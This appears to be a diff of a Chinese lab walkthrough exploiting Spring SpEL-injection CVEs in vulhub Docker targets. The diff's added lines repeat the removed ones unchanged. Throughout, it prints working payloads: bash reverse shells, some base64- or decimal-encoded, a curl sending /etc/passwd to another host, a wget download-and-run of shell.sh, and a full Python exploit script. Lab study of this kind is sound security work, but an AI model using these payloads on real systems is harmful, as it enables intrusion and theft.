@@ -28,10 +28,10 @@ Spring 框架包含的功能大约由 20 个小模块组成。这些模块按组
 首先安装 curl 和 docker
 
 ```
-sudo apt install curl
-sudo apt install docker.io
+sudo apt install curl
+sudo apt install docker.io
 
-docker -v //查看是否安装成功
+docker -v //查看是否安装成功
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOg0Oe9icAlAebUPgm3tcRbKVibcmotFF4cKLj5PDXgWtNcfiaAvuARPM6g/640?wx_fmt=png)
@@ -39,11 +39,11 @@ docker -v //查看是否安装成功
 然后安装 python 和 pip 环境，命令如下
 
 ```
-sudo apt install python
-curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
-sudo python get-pip.py
+sudo apt install python
+curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
+sudo python get-pip.py
 
-pip -V //查看是否安装成功
+pip -V //查看是否安装成功
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCO2tib7moDrYxiaZPN5V5Ts4oYcbiaApPT64ryfkoP1qHPhhibQ4Kx8TiaKzQ/640?wx_fmt=png)
@@ -51,9 +51,9 @@ pip -V //查看是否安装成功
 然后再安装 docker-compose
 
 ```
-pip install docker-compose
-sudo apt install docker-compose
-docker-compose -v
+pip install docker-compose
+sudo apt install docker-compose
+docker-compose -v
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOgq3icW6hE8KqzV9CKXmKxSS3TKltkXDbj3fLu7Wicq8nbZuGxecj0WGQ/640?wx_fmt=png)
@@ -63,7 +63,7 @@ docker-compose -v
 到这个地方 docker 环境就已经搭建好了，这时候需要从 github 上把 vulhub 的漏洞环境给 clone 下来，这里直接 clone 网不太好，我就直接下载下来了 copy 到了靶机上
 
 ```
-git clone https://github.com/vulhub/vulhub.git
+git clone https://github.com/vulhub/vulhub.git
 ```
 
 下载好之后进入 spring 漏洞环境，这里看到有 5 个 CVE 漏洞，我们一个一个来
@@ -117,7 +117,7 @@ http://192.168.1.10:8080/oauth/authorize?response_type=${233*233}&client_id=acme
 使用 github 上找到的 poc 对传入值进行处理
 
 ```
-#!/usr/bin/env pythonmessage = input('Enter message to encode:')poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])for ch in message[1:]: poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)poc += ')}'print(poc)
+#!/usr/bin/env pythonmessage = input('Enter message to encode:')poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])for ch in message[1:]: poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)poc += ')}'print(poc)
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOicX8wEEu1afsvrQcLJjcUiaR3Gv7tUYjNMibhNI2a9MHBYQ7iaxuPdNicFQ/640?wx_fmt=png)
@@ -137,7 +137,7 @@ http://127.0.0.1:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRu
 这里使用 curl 发送一个请求即可得到回显得内容
 
 ```
-curl 192.168.1.2:5555 -d "$(cat /etc/passwd)"
+curl 192.168.1.2:5555 -d "$(cat /etc/passwd)"
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOrsX4woxANssR2cLa1ziboAHyQvkjZpaACxTx8lbntUBarGQrEtibYXHg/640?wx_fmt=png)
@@ -149,7 +149,7 @@ curl 192.168.1.2:5555 -d "$(cat /etc/passwd)"
 使用到 bash 反弹，这里需要绕过 exec() 变形
 
 ```
-bash -i >& /dev/tcp/192.168.1.2/5555 0>&1
+bash -i >& /dev/tcp/192.168.1.2/5555 0>&1
 ```
 
 使用 http://www.jackson-t.ca/runtime-exec-payloads.html 进行 payload 处理
@@ -235,7 +235,7 @@ bp 抓包如下所示
 这里构造一个 bash 反弹的 payload
 
 ```
-&_(new java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/192.168.1.2/5555 0>%261")).start()=vulhub
+&_(new java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/192.168.1.2/5555 0>%261")).start()=vulhub
 ```
 
 打开 nc 监听端口
@@ -281,7 +281,7 @@ Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3 Spring Boot version < 2.0.0M4
 这里先对`customers/1`这个页面 bp 抓包，还是通过 bash 反弹，通过处理后得到命令
 
 ```
-bash -i >& /dev/tcp/192.168.1.2/5555 0>&1bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}
+bash -i >& /dev/tcp/192.168.1.2/5555 0>&1bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}
 ```
 
 因为这里执行的代码被编码为十进制位于 new java.lang.String(new byte[]{xxxxxx}) 中，所以需要对 bash 命令转成十进制编码
@@ -289,7 +289,7 @@ bash -i >& /dev/tcp/192.168.1.2/5555 0>&1bash -c {echo,YmFzaCAtaSA+JiAvZGV
 使用 python 进行编码处理，在 python 中转十进制的方法为`",".join(map(str, (map(ord,"命令"))))`
 
 ```
-",".join(map(str, (map(ord,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}"))))
+",".join(map(str, (map(ord,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}"))))
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCO5ZVjtGNzQib8okdDFicSMkvMKS2v88wggp1A9FHKcKUjmXWLficqHEtibQ/640?wx_fmt=png)
@@ -297,7 +297,7 @@ bash -i >& /dev/tcp/192.168.1.2/5555 0>&1bash -c {echo,YmFzaCAtaSA+JiAvZGV
 得到十进制后放入 bp 包里面进行构造
 
 ```
-[ { "op": "replace",    "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,117,77,105,56,49,78,84,85,49,73,68,65,43,74,106,69,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastname",   "value": "vulhub"  }]
+[ { "op": "replace",    "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,117,77,105,56,49,78,84,85,49,73,68,65,43,74,106,69,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastname",   "value": "vulhub"  }]
 ```
 
 构造后如图所示
@@ -330,7 +330,7 @@ SPEL 命令执行有两种方式，一是静态方法，二是 new 对象
 再看一下 spring-boot-messaging 实现中的代码
 
 ```
-Expression expression = sub.getSelectorExpression();if (expression == null) {    result.add(sessionId, subId);} else {    if (context == null) {        context = new StandardEvaluationContext(message);        context.getPropertyAccessors().add(new DefaultSubscriptionRegistry.SimpMessageHeaderPropertyAccessor());    }    try {        if (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) {            result.add(sessionId, subId);        }    } catch (SpelEvaluationException var13) {        if (this.logger.isDebugEnabled()) {            this.logger.debug("Failed to evaluate selector: " + var13.getMessage());        }    } catch (Throwable var14) {        this.logger.debug("Failed to evaluate selector", var14);    \}\}
+Expression expression = sub.getSelectorExpression();if (expression == null) {    result.add(sessionId, subId);} else {    if (context == null) {        context = new StandardEvaluationContext(message);        context.getPropertyAccessors().add(new DefaultSubscriptionRegistry.SimpMessageHeaderPropertyAccessor());    }    try {        if (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) {            result.add(sessionId, subId);        }    } catch (SpelEvaluationException var13) {        if (this.logger.isDebugEnabled()) {            this.logger.debug("Failed to evaluate selector: " + var13.getMessage());        }    } catch (Throwable var14) {        this.logger.debug("Failed to evaluate selector", var14);    \}\}
 ```
 
 那么一是可以利用`sub.getSelectorExpression()`得到 selector 的表达式，二是利用`Boolean.TRUE.equals(expression.getValue(context, Boolean.class))`获取表达式的值，从而造成命令执行
@@ -349,7 +349,7 @@ Expression expression = sub.getSelectorExpression();if (expression == null
 这里直接使用前辈们写好的 exp，注意修改一下 bash 命令和靶机地址即可
 
 ```
-#!/usr/bin/env python3import requestsimport randomimport stringimport timeimport threadingimport loggingimport sysimport json logging.basicConfig(stream=sys.stdout, level=logging.INFO) def random_str(length):    letters = string.ascii_lowercase + string.digits    return ''.join(random.choice(letters) for c in range(length))  class SockJS(threading.Thread):    def __init__(self, url, *args, **kwargs):        super().__init__(*args, **kwargs)        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'        self.daemon = True        self.session = requests.session()        self.session.headers = {            'Referer': url,            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'        }        self.t = int(time.time()*1000)     def run(self):        url = f'{self.base}/htmlfile?c=_jp.vulhub'        response = self.session.get(url, stream=True)        for line in response.iter_lines():            time.sleep(0.5)         def send(self, command, headers, body=''):        data = [command.upper(), '\n']         data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))                 data.append('\n\n')        data.append(body)        data.append('\x00')        data = json.dumps([''.join(data)])         response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)        if response.status_code != 204:            logging.info(f"send '{command}' data error.")        else:            logging.info(f"send '{command}' data success.")     def __del__(self):        self.session.close()  sockjs = SockJS('http://192.168.1.10:8080/gs-guide-websocket')sockjs.start()time.sleep(1) sockjs.send('connect', {    'accept-version': '1.1,1.0',    'heart-beat': '10000,10000'})sockjs.send('subscribe', {    'selector': "T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}')",    'id': 'sub-0',    'destination': '/topic/greetings'}) data = json.dumps({'name': 'vulhub'})sockjs.send('send', {    'content-length': len(data),    'destination': '/app/hello'}, data)
+#!/usr/bin/env python3import requestsimport randomimport stringimport timeimport threadingimport loggingimport sysimport json logging.basicConfig(stream=sys.stdout, level=logging.INFO) def random_str(length):    letters = string.ascii_lowercase + string.digits    return ''.join(random.choice(letters) for c in range(length))  class SockJS(threading.Thread):    def __init__(self, url, *args, **kwargs):        super().__init__(*args, **kwargs)        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'        self.daemon = True        self.session = requests.session()        self.session.headers = {            'Referer': url,            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'        }        self.t = int(time.time()*1000)     def run(self):        url = f'{self.base}/htmlfile?c=_jp.vulhub'        response = self.session.get(url, stream=True)        for line in response.iter_lines():            time.sleep(0.5)         def send(self, command, headers, body=''):        data = [command.upper(), '\n']         data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))                 data.append('\n\n')        data.append(body)        data.append('\x00')        data = json.dumps([''.join(data)])         response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)        if response.status_code != 204:            logging.info(f"send '{command}' data error.")        else:            logging.info(f"send '{command}' data success.")     def __del__(self):        self.session.close()  sockjs = SockJS('http://192.168.1.10:8080/gs-guide-websocket')sockjs.start()time.sleep(1) sockjs.send('connect', {    'accept-version': '1.1,1.0',    'heart-beat': '10000,10000'})sockjs.send('subscribe', {    'selector': "T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}')",    'id': 'sub-0',    'destination': '/topic/greetings'}) data = json.dumps({'name': 'vulhub'})sockjs.send('send', {    'content-length': len(data),    'destination': '/app/hello'}, data)
 ```
 
 首先还是 bash 编码
@@ -359,7 +359,7 @@ Expression expression = sub.getSelectorExpression();if (expression == null
 修改 exp 中的靶机 ip 和反弹命令
 
 ```
-sockjs = SockJS('http://192.168.1.10:8080/gs-guide-websocket')sockjs.send('subscribe', {    'selector': "T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}')",
+sockjs = SockJS('http://192.168.1.10:8080/gs-guide-websocket')sockjs.send('subscribe', {    'selector': "T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}')",
 ```
 
 如图所示
@@ -409,7 +409,7 @@ SimpleEvaluationContext 的权限则小的多，只支持一些 map 结构，通
 生成一个 shell.sh 文件
 
 ```
-bash -i >& /dev/tcp/192.168.1.2/5555 0>&1
+bash -i >& /dev/tcp/192.168.1.2/5555 0>&1
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCObAekzeKXSxGjoI9VD7kNnTLCutgCa4MAAGaicAWRGOaRB5Oaic5OKoqA/640?wx_fmt=png)
@@ -417,7 +417,7 @@ bash -i >& /dev/tcp/192.168.1.2/5555 0>&1
 用 python 起一个 http 服务，并构造 payload 下载 shell.sh 文件保存在 / tmp / 目录下，名称为 1
 
 ```
-username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/usr/bin/wget -qO /tmp/1 http://192.168.1.2:8000/shell.sh")]=111&password=111&repeated=111&Password=111
+username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/usr/bin/wget -qO /tmp/1 http://192.168.1.2:8000/shell.sh")]=111&password=111&repeated=111&Password=111
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOoJSB762scHe56eLoLJHoEWUKelIEPouGJh5p44uriaBib77ZGIUjocgQ/640?wx_fmt=png)
@@ -425,7 +425,7 @@ username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/usr/b
 nc 打开端口监听再构造 payload 进行命令执行即可收到反弹 shell
 
 ```
-username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/bin/bash /tmp/1")]=111&password=111&repeated=111&Password=111
+username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/bin/bash /tmp/1")]=111&password=111&repeated=111&Password=111
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v5YIO2jUicZgOETEKtXTRSCOOqLrXTZf7IXHcvUickuzXQnTrFEFwPg5ueKlvQpAX2N7RIw7dxmetqg/640?wx_fmt=png)
